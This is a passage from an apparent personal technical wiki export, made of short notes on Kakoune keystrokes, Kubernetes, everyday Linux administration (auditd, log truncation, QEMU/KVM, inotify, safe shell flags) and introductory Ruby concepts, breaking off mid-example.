date: 2020-12-30T11:09
tags:
  - cheatsheet
---

Keystroke Idioms in Kakoune
===========================

Note: the following notation are often used in modal editors (example
for `Ctrl` + `v`):

-   `^V`
-   `Ctrl-V`
-   `C-V`

| English                                 | Kakoune                |
|-----------------------------------------|------------------------|
| Delete Word                             | `wd`                   |
| Delete up to Whitespace                 | `<a-w>d`               |
| Delete Inner Word                       | `<a-i>wd`              |
| Delete Back 4 Words                     | `BBBBd` or `4Bd`       |
| Change to End of word                   | `ec`                   |
| Yank a sentence                         | `<a-a>sy`              |
| Change To next occurrence of `x`        | `txc`                  |
| Select next occurrence of `x`           | `tx`                   |
| Indent 3 lines down                     | `xXX>`                 |
| Unindent within braces                  | `<a-i>}<`              |
| Replace all occurrence                  | `%s` word to replace   |
| Multiple selections                     | `Shift + c`            |
| Search pattern set to current selection | `*`                    |
| Replace selected text with yanked text  | `R`                    |
| Start/stop macro recording              | `Q`                    |
| Split selected text on line ends        | `<a-s>` (`Alt` + `s`)  |
| Keep selections not matching            | `<a-K>` (`Alt` + `K`)  |
| Convert selection to upper case         | `~`                    |
| Easily align text (`=` from all buffer) | `%s=<ret>&`            |
| Select block of similar indentation     | `<a-i>i` (`Alt` + `i`) |

Sources:

-   [The Vim-Inspired Editor with a Linguistic
    Twist](https://cosine.blue/2019-09-06-kakoune.html)
-   [The first two hours of Kakoune in two
    minutes](https://kakoune-editor.github.io/community-articles/2021/01/01/first_two_hours_in_two_minutes.html)


===

<!-- Source: computing/software/kubernetes.md -->
<!-- URL: /computing/software/kubernetes -->
<!-- Title: Kubernetes -->
<!-- Wikilinks: [[computing/software/kubernetes]], [[software/kubernetes]], [[kubernetes]] -->

---
date: 2021-12-26T16:16
---

Kubernetes
==========

Kubernetes is a system created by Google (replacing a previous stack
with system called Borg and Omega) which they made open source.

The name is Greek for *helmsman* or captain (the person who steers the
ship). It is often shortened to **k8s**, the 8 replacing the eight
characters between the K and the S, and some people pronounce this
*keights*.

What it Does
------------

There is not a lot it *doesn't* do.

Contrary to [[docker]] which only cares about starting, stopping and
deleting application (low level), Kubernetes cares about high level:
scheduling, scaling, healing, updating etc.

At a high level, there is a Kubernetes cluster to host applications.
Each nodes in the cluster is running some Kubernetes software and a
container runtime (usually Docker or Containerd). Above all of this
there is the brain of Kubernetes: K8s Control Plane.


===

<!-- Source: computing/software/leaning-toothpick-syndrome.md -->
<!-- URL: /computing/software/leaning-toothpick-syndrome -->
<!-- Title: Leaning Toothpick Syndrome -->
<!-- Wikilinks: [[computing/software/leaning-toothpick-syndrome]], [[software/leaning-toothpick-syndrome]], [[leaning-toothpick-syndrome]] -->

---
date: 2020-08-07
tags:
  - english
---

# Leaning Toothpick Syndrome

In computer programming "Leaning toothpick syndrome" is an expression used when quoted expression
becomes unreadable because it contains a large number of escape characters,
usually backslashes `\`.

Examples:

`\\\\\\\\`

`\/\/`

The official Perl documentation introduced the term to wide usage, apparently.


## Japanese Environment

In Japanese environment, the Yen symbol `¥` is often (always?) used in lieu of backslash `\`. That means LTS is shown differently:

`¥¥¥¥¥¥¥¥`

`¥/¥/`

Second case is more readable.

[^1]: [Leaning toothpick syndrom -
  Wikipedia](https://en.wikipedia.org/wiki/Leaning_toothpick_syndrome)


===

<!-- Source: computing/software/linux.md -->
<!-- URL: /computing/software/linux -->
<!-- Title: Linux -->
<!-- Wikilinks: [[computing/software/linux]], [[software/linux]], [[linux]] -->

---
date: 2020-08-05
tags:
  - linux
---

# Linux

I am not extremly pedantic on the name. I use it quite liberally.

* [[linux-alongside-windows]]#
* [[debian-flavor-cleaning]]#
* [[linux-force-reset-restart]]#
* [[safe-shell-scripts]]#
* [[git-log-a-dog]]#
* [[convert-date-to-current-time-zone]]#
* [[linux-app-launcher]]#
* [[audit-file-access-linux]]#
* [[import-multiple-ovpn-file-networkmanager]]#
* [[convert-ova-to-qcow2]]#
* [[end-of-file-character]]#
* [[wine-network-permissions]]#
* [[inotify-max-user-watches]]#
* [[clear-log-the-proper-way]]#


===

<!-- Source: computing/software/linux/audit-file-access-linux.md -->
<!-- URL: /computing/software/linux/audit-file-access-linux -->
<!-- Title: Audit File Access on Linux -->
<!-- Wikilinks: [[computing/software/linux/audit-file-access-linux]], [[software/linux/audit-file-access-linux]], [[linux/audit-file-access-linux]], [[audit-file-access-linux]] -->

---
date: 2020-08-22T19:02
---

# Audit File Access on Linux

Install the `auditd` packages on Debian/Ubuntu etc.

```sh
apt install auditd audispd-plugins
```

{.ui .info .message}
I didn't add `sudo` by security but it is most probably required.

Then start the service if necessary:

```sh
systemctl start auditd
```

You can now create audit rules for files you want to inspect based on a set of
rules.

```sh
auditctl -w /etc/hosts -p war -k hosts-file
```

Where...
* `w` is the path to the file to **w**atch
* `p` is **p**ermissions filter (**w**rite, **a**ppend, **r**ead)
* `k` is a **k**ey to uniquely identify the audit records produced by the watch

Check that your rule is listed:

```sh
$ auditctl -l
-w /etc/hosts -p rwa -k hosts-file
```

Now we just have to wait for `auditctl` to log some events!

As we used a filter key for our rule (`hosts-file`) it is easy to search for
event with the following command:


```sh
ausearch -ts today -k hosts-file
```


===

<!-- Source: computing/software/linux/clear-log-the-proper-way.md -->
<!-- URL: /computing/software/linux/clear-log-the-proper-way -->
<!-- Title: Clear log the proper way -->
<!-- Wikilinks: [[computing/software/linux/clear-log-the-proper-way]], [[software/linux/clear-log-the-proper-way]], [[linux/clear-log-the-proper-way]], [[clear-log-the-proper-way]] -->

---
date: 2022-08-20
---

Clear log the proper way
========================

The other day I was using Apparmor's `aa-audit` on my Firefox profile
and long story short I ended up with a massive 10GB `syslog` file.

While the "right way" to clear log is actually to rotate it, having 10GB
of almost the same audit log is not helpful. Instead, I used the
`truncate` command:

``` sh
truncate /var/log/syslog --size=500MB
```

500MB is still massive but I prefer to keep some log left, just in case.

The advantage of this method is it doesn't delete the log file but zeros
out its content instead, which prevent permission and missing log files
errors which often cause daemons and some tools to freak out.


===

<!-- Source: computing/software/linux/convert-date-to-current-time-zone.md -->
<!-- URL: /computing/software/linux/convert-date-to-current-time-zone -->
<!-- Title: Convert Date to Current Time Zone -->
<!-- Wikilinks: [[computing/software/linux/convert-date-to-current-time-zone]], [[software/linux/convert-date-to-current-time-zone]], [[linux/convert-date-to-current-time-zone]], [[convert-date-to-current-time-zone]] -->

---
date: 2020-08-18
tags:
  - command
---

# Convert Date to Current Time Zone

Sometimes I wish to participate to online event or just speak with people in a
different time zone.

While there are online converters, I found most of them terribly confusing.

Anyway, convertion can be done offline with just a terminal, so here it goes:

```sh
$ date -d '2014-06-26 23:00 UTC'
Fri 27 Jun 2014 08:00:00 AM JST
```

🌎🌍🌏


===

<!-- Source: computing/software/linux/convert-ova-to-qcow2.md -->
<!-- URL: /computing/software/linux/convert-ova-to-qcow2 -->
<!-- Title: Convert OVA Image to QCOW2 Image (QEMU, virt-manager) -->
<!-- Wikilinks: [[computing/software/linux/convert-ova-to-qcow2]], [[software/linux/convert-ova-to-qcow2]], [[linux/convert-ova-to-qcow2]], [[convert-ova-to-qcow2]] -->

---
date: 2020-10-06T07:11
---

# Convert OVA Image to QCOW2 Image (QEMU, virt-manager)

A lot of Linux image are passed around as `ova` file. All that is required is
to download and use Virtual Box but you may prefere QEMU.

I've used `ova` file before but didn't realize it's just an archive, which
means it can ve open with `tar`.

```sh
tar -xvf my-image.ova
```

This give us a bunch of file, including a `vmdk` which we want to convert to
`qcow2` image.

This may take a while:

```sh
qemu-img convert my-image-disk001.vmdk my-image.qcow2 -O qcow2
```

Check if the convertion was successful:

```sh
file my-image.qcow2
```

This should output something similar:

```sh
my-image.qcow2: QEMU QCOW2 Image (v3), 10000 bytes
```

You now have a `qcow2` image you can use with Virt-Manager!



===

<!-- Source: computing/software/linux/debian-flavor-cleaning.md -->
<!-- URL: /computing/software/linux/debian-flavor-cleaning -->
<!-- Title: Debian/Ubuntu 系のお掃除 -->
<!-- Wikilinks: [[computing/software/linux/debian-flavor-cleaning]], [[software/linux/debian-flavor-cleaning]], [[linux/debian-flavor-cleaning]], [[debian-flavor-cleaning]] -->

---
date: 2020-08-05
tags:
  - linux
---

# Debian/Ubuntu 系のお掃除

{.ui .warning .message}
がっつりお掃除しすぎて今の環境が壊れてしまったというのは悲しすぎるので下記を行う前に必ずバックアップをとっておきましょう。そしてそのバックアップが使えることも確認しましょう。

GNU/Linux のお掃除は気持ちの問題だとよく聞きますが、容量がいっぱいいっぱいになったときに揃えて手順を確認しました。


## 無駄パッケージの削除

まず、無駄なパッケージを削除します。

```sh
sudo apt clean
sudo apt autoremove
```

アップグレード後、あらゆるパッケージの旧バージョンのファイルが残ったりします。邪魔ではないが、どこかに存在することだけで気になります。僕の几帳面なところです。(笑)

`apt` が見つけてくれない残りのパッケージを削除するため、 `synaptic` を使います。

```sh
sudo apt install synaptic
```

起動後、 `Not Installed (residual config)` タブに移動して、パッケージを右クリックして `Mark for complete removal` を選択します。


## 不要な linux-headers の削除

次、 `Installed` タブに移動して、 `linux-headers` を検索して*最新ではない*パッケージを右クリックして `Mark for complete removal` を選択します。間違って最新のやつを消さないようにしましょう。

削除した後、 `sudo update-grub` で grub のメニューを更新します。


## 不要な言語の削除

不要な言語をアンインストールするため、 `localepurge` が使えます。

```sh
sudo apt install localepurge
```


## 孤児なパッケージの削除

`deborphan` を使って、孤児なパッケージ(依存関係がないパッケージ)のリストを作ってもります。


```sh
deborphan --guess-all
```

このコマンドで孤児なパッケージを教えてくれますが、一部削除してはいけないものがありますので十分に気をつけて選定しましょう。
`lib` の依存関係が複雑のため、数回 `deborphan` を実行する必要があるかもしれません。


## 今後のお掃除を単純化するため

なにをインストールしたかを追跡するため、 `debfoster` というものを使えます。

```sh
sudo apt install debfoster
# 初期のキープするリストを作成
sudo debfoster -q
# システムをリストに強制的に従わせる
sudo debfoster -f
```

そして、たまに下記のコマンドを実行して孤児になったパッケージがあるか確認します。

```sh
sudo debfoster
```

以上!


===

<!-- Source: computing/software/linux/end-of-file-character.md -->
<!-- URL: /computing/software/linux/end-of-file-character -->
<!-- Title: End Of File Character -->
<!-- Wikilinks: [[computing/software/linux/end-of-file-character]], [[software/linux/end-of-file-character]], [[linux/end-of-file-character]], [[end-of-file-character]] -->

---
date: 2021-06-06T16:49
---

# End Of File Character

In Linux, you can send an End Of File (EOF) character by typing `Ctrl + D`.

Using EOL is useful for **line-based programs** which read input one line
at a time until they reach the end of the input. This is the case of the
`sort` command, for example.


===

<!-- Source: computing/software/linux/git-log-a-dog.md -->
<!-- URL: /computing/software/linux/git-log-a-dog -->
<!-- Title: git log a dog 🐶 -->
<!-- Wikilinks: [[computing/software/linux/git-log-a-dog]], [[software/linux/git-log-a-dog]], [[linux/git-log-a-dog]], [[git-log-a-dog]] -->

---
date: 2020-08-18
---

# git log a dog 🐶

Best way to browse the log in terminal:

```sh
git log --all --decorate --oneline --graph
```

Taking each flags makes the mnemonic is `git log A DOG` 🐶


===

<!-- Source: computing/software/linux/import-multiple-ovpn-file-networkmanager.md -->
<!-- URL: /computing/software/linux/import-multiple-ovpn-file-networkmanager -->
<!-- Title: Import Multiple OVPN Files to NetworkManager -->
<!-- Wikilinks: [[computing/software/linux/import-multiple-ovpn-file-networkmanager]], [[software/linux/import-multiple-ovpn-file-networkmanager]], [[linux/import-multiple-ovpn-file-networkmanager]], [[import-multiple-ovpn-file-networkmanager]] -->

---
date: 2020-09-21T14:20
---

# Import Multiple OVPN Files to NetworkManager

Importing using the GUI is tiresome where you have a lot of OVPN files.

This little code can help import every OVPN file at once. It does not set
username and password therefor if this is needed, one should use the GUI to add
username/password.

```sh
for i in *.ovpn; do nmcli connection import file "$i" type openvpn; done
```


[Scripting a way to quickly import OVPN files to NetworkManager on
Ubuntu](https://unix.stackexchange.com/a/301856)


===

<!-- Source: computing/software/linux/inotify-max-user-watches.md -->
<!-- URL: /computing/software/linux/inotify-max-user-watches -->
<!-- Title: Update inotify max user watches -->
<!-- Wikilinks: [[computing/software/linux/inotify-max-user-watches]], [[software/linux/inotify-max-user-watches]], [[linux/inotify-max-user-watches]], [[inotify-max-user-watches]] -->

---
date: 2022-01-06T10:27
---

Update inotify max user watches
===============================

On Linux, `inotify` provides a mechanism for monitoring file system
events[^1]. Each call to the API is a "watch", which corresponds to one
watched file or directory. The common max watch value *was*
$8 \times 1024 = 8192$, but on more recent version of the Linux kernel,
the value is dynamically generated to use no more than 1% of addressable
memory within the range `[8192, 1048576]`[^2].

Pop!\_OS
[uses](https://github.com/pop-os/linux/blob/master/fs/notify/inotify/inotify_user.c#L818)
the kernel version 5.11, which first include this mechanism. But for
some reason my number of `inotify` was way lower than 1% of my total
memory.

Fortunately, the maximum number of watches can be manually updated. Any
number in the given range set in the Linux kernel above is likely good
enough. I like to use a number between 1% to 4%[^3] of my total memory.
I also like it to be a number divisible by 1024 but this is just
personal preference.

The total memory can be found using the `vmstat -s` command.

To test the new number, one can use the following command:

``` sh
sudo sysctl -w fs.inotify.max_user_watches=162816
```

The command above is for testing purpose, as after a reboot the value
will be lost.

After much test, the new number should preferably be committed inside a
`/etc/sysctl.d/90-override.conf` file (as is recommended by
`/usr/lib/sysctl.d/50-default.conf`).

Rebooting or using `sudo sysctl -p /etc/sysctl.d/90-override.conf` will
load the new value.

[^1]: [inotify(7)](https://www.man7.org/linux/man-pages/man7/inotify.7.html)

[^2]: [inotify: Increase default inotify.max\_user\_watches limit to
    1048576](https://github.com/torvalds/linux/commit/92890123749bafc317bbfacbe0a62ce08d78efb7)

[^3]: 4% is what `epoll` uses as a [maximum
    value](https://man7.org/linux/man-pages/man7/epoll.7.html)


===

<!-- Source: computing/software/linux/linux-alongside-windows.md -->
<!-- URL: /computing/software/linux/linux-alongside-windows -->
<!-- Title: Linux alongside Windows -->
<!-- Wikilinks: [[computing/software/linux/linux-alongside-windows]], [[software/linux/linux-alongside-windows]], [[linux/linux-alongside-windows]], [[linux-alongside-windows]] -->

---
date: 2020-08-02
tags:
  - windows
  - linux
---

# Linux alongside Windows

Installation of GNU/Linux nowadays is far easier than it was in late 2000s.

Most distributions can be installed on one partition. Still, I found it easier
to create three partitions, namely `/ (root)`, `/home` and `/swap`.

<table class="ui celled table">
  <thead>
    <tr>
      <th>Size</th>
      <th>Type for the new partition</th>
      <th>Location for the new partition</th>
      <th>Use as</th>
      <th>Mount point</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Size">1024 MB (or whatever)</td>
      <td data-label="Type for the new partition">Primary</td>
      <td data-label="Location for the new partition">Beginning of this space</td>
      <td data-label="Use as">swap area</td>
      <td data-label="Mount point"></td>
    </tr>
    <tr>
      <td data-label="Size">20480 MB (minimum)</td>
      <td data-label="Type for the new partition">Primary</td>
      <td data-label="Location for the new partition">Beginning of this space</td>
      <td data-label="Use as">EXT4 journaling file system</td>
      <td data-label="Mount point">/</td>
    </tr>
    <tr>
      <td data-label="Size">Whatever needed</td>
      <td data-label="Type for the new partition">Primary</td>
      <td data-label="Location for the new partition">Beginning of this space</td>
      <td data-label="Use as">EXT4 journaling file system</td>
      <td data-label="Mount point">/home</td>
    </tr>
  </tbody>
</table>

An easy to miss important step is to set the **Device for boot loader installation** to **Windows Boot Manager** (generaly a `efi` type).

While it's possible to boot Linux another way, on some system Windows tends to boot first.

More informations on [TecMint](https://www.tecmint.com/install-linux-mint-alongside-windows-dual-boot-uefi-mode/).


[[linux-full-disk-encryption]]#


===

<!-- Source: computing/software/linux/linux-app-launcher.md -->
<!-- URL: /computing/software/linux/linux-app-launcher -->
<!-- Title: Add Linux App to Launcher -->
<!-- Wikilinks: [[computing/software/linux/linux-app-launcher]], [[software/linux/linux-app-launcher]], [[linux/linux-app-launcher]], [[linux-app-launcher]] -->

---
date: 2020-08-22T22:22
---

# Add Linux App to Launcher

The easiest way is to copy a `.desktop` file inside
`$HOME/.local/share/applications` and work from here:

```desktop
[Desktop Entry]
Encoding=UTF-8
Value=1.0
Type=Application
Name=The Dark Mod
GenericName=The Dark Mod
Comment=The Dark Mod
Icon=$HOME/darkmod/TDM_icon.ico
Exec="$HOME/darkmod/thedarkmod.x64" %U
Categories=Game;
Path=$HOME/darkmod

```

(The Dark Mod is great by the way)


===

<!-- Source: computing/software/linux/linux-force-reset-restart.md -->
<!-- URL: /computing/software/linux/linux-force-reset-restart -->
<!-- Title: Unix で強制終了・強制再起動 -->
<!-- Wikilinks: [[computing/software/linux/linux-force-reset-restart]], [[software/linux/linux-force-reset-restart]], [[linux/linux-force-reset-restart]], [[linux-force-reset-restart]] -->

---
date: 2020-08-18
tags:
  - command
---

# Unix で強制終了・強制再起動

Pop!_OS でバグに滅多に遭わないのでほとんど使いませんが、画面がフリーズしている時に使える便利なコマンドを記載します。

`Alt` + `SysRq` + ? を押下して ? の代わりに、順番に `R`, `E`, `I`, `S`, `U`,
`B` を押下します。

なぜこんなながいかと思うでしょうが、一応[理由があります](https://ja.wikipedia.org/wiki/%E3%83%9E%E3%82%B8%E3%83%83%E3%82%AFSysRq%E3%82%AD%E3%83%BC)。

```
unRaw      (X Window System からキーボードの制御を取り戻す)
 tErminate (すべてのプロセスに SIGTERM シグナルを送り、正常に終了させる)
 kIll      (すべてのプロセスに SIGKILL シグナルを送り、強制的に終了させる)
  Sync     (書き込みキャッシュのデータをディスクに書き込む)
  Unmount  (すべてのファイルシステムを読み込み専用で再マウントする)
reBoot     (システムを再起動する)
```

さすがにこれは覚えにくいのでこちらの語呂合わせを

> "Raising Elephants Is So Utterly Boring" (ゾウを育てるって、もうとっても退屈)

> "Reboot Even If System Utterly Broken" (リブートするよ。たとえシステムが完全に壊れてたとしても)


ちなみに、 `R` `E` と `I` は確か Pop!_OS で無効になっています (セキュリティのため?) が、ゾウさん🐘の順番でもう、覚えましたので全部押します。


===

<!-- Source: computing/software/linux/linux-full-disk-encryption.md -->
<!-- URL: /computing/software/linux/linux-full-disk-encryption -->
<!-- Title: Linux Full Disk Encryption -->
<!-- Wikilinks: [[computing/software/linux/linux-full-disk-encryption]], [[software/linux/linux-full-disk-encryption]], [[linux/linux-full-disk-encryption]], [[linux-full-disk-encryption]] -->

---
date: 2020-08-02
tags:
  - linux
---

# Linux Full Disk Encryption

[Pop!_OS](https://pop.system76.com/) (and probably some others) does it transparently, which is nice.

I have not figured out how to do it manually yet but [Linode](https://www.linode.com/docs/security/encryption/use-luks-for-full-disk-encryption/) seems to have a good guide.


===

<!-- Source: computing/software/linux/linux-process-substitution.md -->
<!-- URL: /computing/software/linux/linux-process-substitution -->
<!-- Title: Linux Process Substitution -->
<!-- Wikilinks: [[computing/software/linux/linux-process-substitution]], [[software/linux/linux-process-substitution]], [[linux/linux-process-substitution]], [[linux-process-substitution]] -->

---
date: '2023-06-04T17:34:51+0900'
---

# Linux Process Substitution

Another common pattern is wanting to get the output of a command as a variable.
This can be done with *command substitution*.

Whenever you place `$( CMD )` it will execute `CMD`, get the output of the command and substitute it in place.
For example, if you do `for file in $(ls)`, the shell will first call `ls` and then iterate over those values.

A lesser known similar feature is *process substitution*, `<( CMD )` will execute `CMD` and place the output in a temporary file and substitute the `<()` with that file's name.
This is useful when commands expect values to be passed by file instead of by STDIN.
For example, `diff <(ls foo) <(ls bar)` will show differences between files in directories `foo` and `bar`.

``` {.sh}
# Show differences between files in foo and bar
diff <(ls foo) <(ls bar)
```

[Source](https://missing.csail.mit.edu/2020/shell-tools/)


===

<!-- Source: computing/software/linux/qemu-kvm-fundamentals.md -->
<!-- URL: /computing/software/linux/qemu-kvm-fundamentals -->
<!-- Title: QEMU/KVM Fundamentals -->
<!-- Wikilinks: [[computing/software/linux/qemu-kvm-fundamentals]], [[software/linux/qemu-kvm-fundamentals]], [[linux/qemu-kvm-fundamentals]], [[qemu-kvm-fundamentals]] -->

---
date: 2022-08-20
---

QEMU/KVM Fundamentals
=====================

This is a collection of random information about QEMU and KVM (mostly
used through Virtual Machine Manager). In an ideal world I'd spend more
time studying them all but I don't have that kind of time so this will
do.

Difference Between QEMU, KVM, libvirt and Virtual Machine Manager
-----------------------------------------------------------------

### QEMU

QEMU (Quick Emulator) is a type 2 hypervisor created by French developer
Fabrice Bellard[^1] in 2003. As a normal hypervisor, it is able to
emulate hardware such as CPU and I/O devices. It interpret instructions
sent to VM as real instruction send to the physical CPU.

There used to be a `qemu-kvm`, which was a fork of QEMU to integrate KVM
acceleration (see below) but it has then been merged to mainline QEMU.

### KVM

KVM is a kernel module for Linux developed by a company later acquired
by Red Hat. It's an API provided by the kernel for user space. To use it
you need to write C code to call its module and create a virtual
machine. KVM concerns itself with privileged CPU instructions.

End-user typically use KVM through QEMU (where it's present as an
acceleration method), although other VM manager, such as `kvmtool` also
use it.

### libvirt

`libvirt` is a CLI tool to unify the API used to create and manager VMs.
It makes it easier for the end-user to interact with and create VMs with
CLI such as `virsh`, `virt-manager` and `virt-install`.

### Virtual Machine Manager (virt-manager)

Virtual Machine Manager is a GUI build on top of `libvirt`, which itself
interacts with QEMU, which is typically used with KVM acceleration.

[Source](https://superuser.com/a/1490196)

Bests Practices
---------------

To not (rightfully) trigger AppArmor's (default) profile, ISOs should be
placed in `/var/lib/libvirt/boot/` and disk images (`.qcow2` files) in
`/var/lib/libvirt/images/`.

Adding two virtual networks, one external (NAT) and one isolated. See
[[pentest-home-lab-environment-with-qemu-kvm]]# for an example.

### Install with CLI

It's possible to use `virt-install` to install with the CLI as to make a
installation less painless but I haven't checked yet (TODO).

It's also possible to extract the XML file from already created VM in
order to use that for installing with the same settings (also TODO).

Windows Drivers
---------------

Windows needs special drivers called "VirtIO" that can be downloaded
[here](https://github.com/virtio-win/virtio-win-pkg-scripts#downloads).

Adding the ISO as a CD, we can install the required driver during
Windows' installation. Required drivers are `NetKVM` for network and
`viostor` for SCSI (drives).

[Source](https://www.wildtechgarden.ca/docs/deploy-admin/windows-and-linux/linux-focus-with-windows/windows-in-a-libvirt-kvm-vm/)

### Windows 11

Windows 11 needs UEFI and TPM. I haven't tried it yet but [this
blog](https://steventang.net/blog/2021/kvm-win11) gives a good
explanation of what's required.

Kali Linux
----------

Apparently Kali is not a fan of VirtIO for its video. Changing the
display interface to QXL fixes the problem.

[^1]: Trivia: Bellard also developed FFmpeg.


===

<!-- Source: computing/software/linux/qemu-networking.md -->
<!-- URL: /computing/software/linux/qemu-networking -->
<!-- Title: QEMU Networking -->
<!-- Wikilinks: [[computing/software/linux/qemu-networking]], [[software/linux/qemu-networking]], [[linux/qemu-networking]], [[qemu-networking]] -->

---
date: 2022-08-18
---

QEMU Networking
===============

Networking Modes
----------------

Most hypervisors have the following default networking options and
modes:

-   **NAT**: hypervisor acts as a router to the guest machine which gets
    an IP address from the DHCP server integrated into the hypervisor.
    When the guest machine connects to the internet, the hypervisor does
    the NATing to translate the IP addresses for the guest VM to be able
    to access the internet.
-   **Bridged**: hypervisor uses the host network driver directly, i.e.
    it injects traffic from the guest machine directly to the host
    machine network driver. This is useful when wanting the guest VMs to
    appear as they were physically connected to the network, or when
    using a packet sniffer like Wireshark to check guest VM's packets.
-   **Host-Only**: a software interface is created on the host machine
    that can be used to see the guest virtual machines, but the VMs
    themselves cannot connect to the outside world (one-way direction).
-   **Internal**: the guest VM can talk between themselves, but cannot
    talk to the world outside the host. Useful when needing to isolate a
    guest machine.

Simpler representation of the difference between each mode:

| Description                            | NAT | Bridged | Host-Only | Internal |
| -------------------------------------- | --- | ------- | --------- | -------- |
| Do the VMs see the devices in the LAN? | y   | y       | n         | n        |
| Do the LAN devices see the VMs?        | n   | y       | n         | n        |
| Do the VMs see themselves?             | n   | y       | y         | y        |
| Can VMs connect to the Internet?       | y   | y       | n         | n        |
| Can host connect to the VMs?           | n   | y       | y         | n        |

[Sources](https://libvirt.org/formatnetwork.html#isolated-network-config)

QEMU/KVM uses slightly different names but the same effect can be
achieve.

Examples
--------

See [[pentest-home-lab-environment-with-qemu-kvm]]#


===

<!-- Source: computing/software/linux/safe-shell-scripts.md -->
<!-- URL: /computing/software/linux/safe-shell-scripts -->
<!-- Title: Command for Safe Shell Scripts -->
<!-- Wikilinks: [[computing/software/linux/safe-shell-scripts]], [[software/linux/safe-shell-scripts]], [[linux/safe-shell-scripts]], [[safe-shell-scripts]] -->

---
date: 2020-08-18
tags:
  - command
---

# Command for Safe Shell Scripts

I came across some good advice form the [MIT Student Information Processing
Board](https://sipb.mit.edu/doc/safe-shell/) regarding writting safe shell
scripts.

The recommandation is to use the following command in bash scripts[^1]:

```bash
set -euf -o pipefail
```

## Quick Explanation

```bash
set -e
```

Exit the whole script if a command fail, instead of resuming on the next line.


```bash
set -u
```

Unset variables are treated as an error and script exit immediately.


```bash
set -f
```

Disable filename expansion (globbing) upon seeing `*`, `?` etc.
Obviously, remove for globbing.


```bash
set -o pipefail
```

Causes pipeline (commands with `|`) to produce failure return code if any
command errors, not just the last one. With `set -e` set above, this will exit
our script.


[^1]: Remove `-o` flag for dash.


===

<!-- Source: computing/software/linux/wine-network-permissions.md -->
<!-- URL: /computing/software/linux/wine-network-permissions -->
<!-- Title: Wine Network Permissions -->
<!-- Wikilinks: [[computing/software/linux/wine-network-permissions]], [[software/linux/wine-network-permissions]], [[linux/wine-network-permissions]], [[wine-network-permissions]] -->

---
date: 2021-09-17T10:05
---

# Wine Network Permissions

Newer versions of Linux allow granular permission control to grant only
required permission to specified files. This allow Wine to open a raw
sockets for normal user.

The command to give network permission to wine is:

```sh
sudo setcap cap_net_raw+epi /usr/bin/wine-preloader
```

In the past, only super user (root) could access raw sockets, and running
Wine as root is a **bad idea**.

Source: [Wine
FAQ](https://wiki.winehq.org/FAQ#Failed_to_use_ICMP_.28network_ping.29.2C_this_requires_special_permissions)


===

<!-- Source: computing/software/local-variable-scope.md -->
<!-- URL: /computing/software/local-variable-scope -->
<!-- Title: Local Variable Scope -->
<!-- Wikilinks: [[computing/software/local-variable-scope]], [[software/local-variable-scope]], [[local-variable-scope]] -->

---
date: 2020-09-15T23:22
---

# Local Variable Scope

The scope of a variable indicates where in a program a particular variable is
available for use.

A variable's scope is defined by where the variable is initialized (or
created).

In Ruby, the scope of a variable is determined by a _block_, or a piece of code
after a method invocation, usually delimited by curly braces `{}` or
`do/end`[^1].


## Inner Scope and Outer Scope

The concept of _inner scope_ and _outer scope_ is dependant of the context in
which they are referenced. Like the name suggest, the inner scope is _inner_
relative to the outer scope.

For example, let's say we have a program in a text file. The program inside has
a block. Relative to the program (outer scope), inside the block is the inner
scope.

Now, if in this block we have yet another block, this second block will be the
inner scope, relative to the first block which becomes itself a outer scope.

That being said, the important point is:

**Inner scope *CAN* access variables initialized in an outer scope but a outer
scope *CAN'T* access variables initialized in an inner scope.**


### Example

```ruby
a = 9    # Integer 9 assigned to variable a in the outer scope

loop do  # Method invocation with a block
  a = 5  # Integer 5 assigned to variable a in the inner scope
  b = 3  # Integer 3 assigned to variable b in the inner scope
  break
end

puts a  # => 5
puts b  # => undefined local variable or method `b'
```

Source: [Variable Scope, Introduction to Programming with Ruby](https://launchschool.com/books/ruby/read/variables#variablescope)


[^1]: Not all `do/end` pairs imply a block: [[part-of-code-block-or-not]]#


===

<!-- Source: computing/software/logical-operators.md -->
<!-- URL: /computing/software/logical-operators -->
<!-- Title: Logical Operators -->
<!-- Wikilinks: [[computing/software/logical-operators]], [[software/logical-operators]], [[logical-operators]] -->

---
date: 2021-03-13T16:49
---

# Logical Operators

Logical operators are symbols or words used to connect two or more expressions.
They can be used, although not always, to test the relationship between two
expressions, in conjonction with conditionals (`if`, `else`...).

Their counterparts in electronic circuit are the logic gates symboles such as
`AND` and `OR`, which are sometimes used to "physically" represent logical
operators.

In Ruby, as well as in most programming language, logical operators are `&&`,
`||` and `!`.

Ruby also have `and`, `or` and `not` which can respectively be used in lieu of
the operators above. Note however that their precedence are lower than their
mathematical symboles counterpart.

## How to Use Logical Operators

### Logical AND

The AND operator `&&` evaluates _both_ expressions to the left and to the
right. Both have to evaluate to true in order for the entire expression to be
evaluated to true.

```irb
irb :001 > (4 == 4) && (5 == 5)
=> true

irb :002 > (4 == 5) && (5 == 5)
=> false

irb :002 > (4 == 5) && (5 == 6)
=> false
```

### Logical OR

The OR operator `||` first evaluates the expressions to the left. If it
evaluate to true, the entire expression evaluates to true, whatever is on the
right. If it evaluates to false, the OR operator then evaluates the expression
on the right. One of the two expression has to evaluate to true for the entire
expression to evaluate to true.

```irb
irb :001 > (4 == 4) || (5 == 5)
=> true

irb :002 > (4 == 5) || (5 == 5)
=> true

irb :002 > (4 == 5) || (5 == 6)
=> false
```

### NOT Operator

In fronte of a boolean expression, it change the boolean value to its opposite.

```irb
irb :001 > !(4 == 4)
=> false
```

Note that the value in parentheses are evaluated first, and the result of the
evaluation is then flipped by `!`.

## Order of Precedence in Ruby

When evaluating multiple expressions, Ruby follows an **order of precedence**.
From highest order of precegence to lowest, it goes like the following:

- **Comparison**: `<=`, `<`, `>`, `>=`
- **Equality**: `==`, `!=`
- **Logical AND**: `&&`
- **Logical OR**: `||`

This is important: statements are not necessarily executed from left to right.

```ruby
if x && y || z
  # do something
end
```

`x && y` is executed first. If that statement is true, the condition is met and
the program will enter inside `if..end`. If it's false, then `z` will be
evaluated. The code on the next line will be executed if `z` is true, it won't
otherwise.

{.ui .info .message}
Using parentheses to group expressions together when possible helps with
readability and helps the computer to understand our intention more accurately.
Parentheses are evaluated in normal algebraic order.


===

<!-- Source: computing/software/method-definition-method-invocation.md -->
<!-- URL: /computing/software/method-definition-method-invocation -->
<!-- Title: Method Definition and Method Invocation -->
<!-- Wikilinks: [[computing/software/method-definition-method-invocation]], [[software/method-definition-method-invocation]], [[method-definition-method-invocation]] -->

---
date: 2020-09-25T08:21
---

# Method Definition and Method Invocation

## Method Definition

Method definition is the action of creating a method using the `def` keyword:

```ruby
def greeting      # Line 1 - 3: method definition
